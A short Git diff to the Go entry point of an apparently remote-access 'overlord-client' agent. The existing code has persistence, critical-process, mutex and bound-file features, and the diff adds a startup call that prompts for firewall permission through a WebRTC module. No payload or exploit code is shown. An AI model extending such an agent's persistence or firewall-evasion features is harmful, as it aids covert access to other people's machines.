@@ -8,6 +8,7 @@ import (
 	"overlord-client/cmd/agent/criticalproc"
 	"overlord-client/cmd/agent/mutex"
 	"overlord-client/cmd/agent/persistence"
+	"overlord-client/cmd/agent/webrtcpub"
 )
 
 func main() {
@@ -21,6 +22,7 @@ func main() {
 	}
 
 	runBoundFiles()
+	webrtcpub.PromptFirewallPermissionOnStartup()
 
 	if cfg.EnablePersistence {
 		if isRunningInMemory() {
